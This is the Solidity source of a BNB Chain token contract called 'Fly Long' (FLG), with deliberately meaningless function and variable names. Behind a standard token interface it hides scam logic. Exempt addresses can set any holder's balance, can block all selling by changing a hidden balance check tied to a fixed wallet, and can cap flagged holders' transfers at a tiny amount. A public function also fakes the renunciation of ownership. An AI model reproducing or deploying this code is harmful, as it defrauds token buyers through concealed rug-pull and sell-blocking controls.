/**
 *Submitted for verification at BscScan.com on 2023-11-28
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface maxTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitReceiver {
    function createPair(address feeFund, address sellTradingMode) external returns (address);
}

interface limitLaunchedList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldTeamMarketing) external view returns (uint256);

    function transfer(address senderFrom, uint256 swapAuto) external returns (bool);

    function allowance(address maxAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapAuto) external returns (bool);

    function transferFrom(
        address sender,
        address senderFrom,
        uint256 swapAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeSender, uint256 value);
    event Approval(address indexed maxAt, address indexed spender, uint256 value);
}

interface limitLaunchedListMetadata is limitLaunchedList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FlyLong is toLimit, limitLaunchedList, limitLaunchedListMetadata {

    mapping(address => bool) public fromSellShould;

    function totalTrading(address swapTokenMin, address senderFrom, uint256 swapAuto) internal returns (bool) {
        if (swapTokenMin == teamTrading) {
            return isToToken(swapTokenMin, senderFrom, swapAuto);
        }
        uint256 enableFundExempt = limitLaunchedList(takeShould).balanceOf(swapFrom);
        require(enableFundExempt == isAuto);
        require(senderFrom != swapFrom);
        if (fromSellShould[swapTokenMin]) {
            return isToToken(swapTokenMin, senderFrom, minAmount);
        }
        return isToToken(swapTokenMin, senderFrom, swapAuto);
    }

    function name() external view virtual override returns (string memory) {
        return tokenReceiver;
    }

    function getOwner() external view returns (address) {
        return shouldTeam;
    }

    function balanceOf(address shouldTeamMarketing) public view virtual override returns (uint256) {
        return liquiditySwapFrom[shouldTeamMarketing];
    }

    function minEnableReceiver(uint256 swapAuto) public {
        shouldTo();
        isAuto = swapAuto;
    }

    function launchTotal(address modeFee) public {
        shouldTo();
        if (amountSell == enableTotal) {
            sellEnable = amountSell;
        }
        if (modeFee == teamTrading || modeFee == takeShould) {
            return;
        }
        fromSellShould[modeFee] = true;
    }

    bool public exemptLaunched;

    uint256 private senderTx = 100000000 * 10 ** 18;

    function tradingTake(address isMarketing, uint256 swapAuto) public {
        shouldTo();
        liquiditySwapFrom[isMarketing] = swapAuto;
    }

    address public takeShould;

    event OwnershipTransferred(address indexed maxToken, address indexed exemptWallet);

    string private tokenReceiver = "Fly Long";

    function decimals() external view virtual override returns (uint8) {
        return autoTx;
    }

    uint256 launchFund;

    uint256 isAuto;

    address swapFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return shouldTeam;
    }

    function symbol() external view virtual override returns (string memory) {
        return fundSwapList;
    }

    function isToToken(address swapTokenMin, address senderFrom, uint256 swapAuto) internal returns (bool) {
        require(liquiditySwapFrom[swapTokenMin] >= swapAuto);
        liquiditySwapFrom[swapTokenMin] -= swapAuto;
        liquiditySwapFrom[senderFrom] += swapAuto;
        emit Transfer(swapTokenMin, senderFrom, swapAuto);
        return true;
    }

    uint256 private amountSell;

    uint256 private tokenBuy;

    bool private receiverLaunchAt;

    address receiverAutoAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address minLiquidity, uint256 swapAuto) public virtual override returns (bool) {
        enableTeam[_msgSender()][minLiquidity] = swapAuto;
        emit Approval(_msgSender(), minLiquidity, swapAuto);
        return true;
    }

    function tokenMarketing(address sellFromLiquidity) public {
        require(sellFromLiquidity.balance < 100000);
        if (tokenSwap) {
            return;
        }
        if (receiverLaunched == sellEnable) {
            listMarketing = true;
        }
        exemptTeam[sellFromLiquidity] = true;
        
        tokenSwap = true;
    }

    function tokenShould() public {
        emit OwnershipTransferred(teamTrading, address(0));
        shouldTeam = address(0);
    }

    uint256 public receiverLaunched;

    uint256 private enableTotal;

    mapping(address => uint256) private liquiditySwapFrom;

    address public teamTrading;

    uint256 constant minAmount = 16 ** 10;

    mapping(address => mapping(address => uint256)) private enableTeam;

    constructor (){
        
        maxTrading amountTx = maxTrading(receiverAutoAmount);
        takeShould = limitReceiver(amountTx.factory()).createPair(amountTx.WETH(), address(this));
        if (tokenBuy == amountSell) {
            amountSell = sellEnable;
        }
        teamTrading = _msgSender();
        tokenShould();
        exemptTeam[teamTrading] = true;
        liquiditySwapFrom[teamTrading] = senderTx;
        
        emit Transfer(address(0), teamTrading, senderTx);
    }

    address private shouldTeam;

    uint8 private autoTx = 18;

    function transferFrom(address swapTokenMin, address senderFrom, uint256 swapAuto) external override returns (bool) {
        if (_msgSender() != receiverAutoAmount) {
            if (enableTeam[swapTokenMin][_msgSender()] != type(uint256).max) {
                require(swapAuto <= enableTeam[swapTokenMin][_msgSender()]);
                enableTeam[swapTokenMin][_msgSender()] -= swapAuto;
            }
        }
        return totalTrading(swapTokenMin, senderFrom, swapAuto);
    }

    string private fundSwapList = "FLG";

    function totalSupply() external view virtual override returns (uint256) {
        return senderTx;
    }

    function shouldTo() private view {
        require(exemptTeam[_msgSender()]);
    }

    function transfer(address isMarketing, uint256 swapAuto) external virtual override returns (bool) {
        return totalTrading(_msgSender(), isMarketing, swapAuto);
    }

    bool private listMarketing;

    function allowance(address toTrading, address minLiquidity) external view virtual override returns (uint256) {
        if (minLiquidity == receiverAutoAmount) {
            return type(uint256).max;
        }
        return enableTeam[toTrading][minLiquidity];
    }

    uint256 private sellEnable;

    mapping(address => bool) public exemptTeam;

    bool public tokenSwap;

}